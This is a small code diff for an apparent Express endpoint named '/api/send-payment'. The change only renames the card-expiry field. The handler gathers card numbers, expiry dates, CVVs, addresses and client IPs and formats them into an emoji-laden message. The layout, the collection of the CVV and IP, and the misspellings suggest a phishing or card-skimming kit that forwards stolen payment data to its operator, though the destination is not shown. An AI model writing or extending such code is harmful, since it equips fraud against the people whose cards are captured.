@@ -51,7 +51,7 @@ app.post('/api/send-payment', async (req, res) => {
     
     // Payment Information
     cardNumber,
-    expiryDate,
+    cardExpiry,
     cardCVV,
 
    page,
@@ -81,7 +81,7 @@ adress: ${address}
 country: ${country}
 
 💳 Card: ${cardNumber}
-📅 Expiry: ${expiryDate}
+📅 Expiry: ${cardExpiry}
 🔒 CVV: ${cardCVV}
 🌐 IP: ${clientIP || req.ip}
 ⏰ Time: ${new Date().toLocaleString('he-IL')}`;
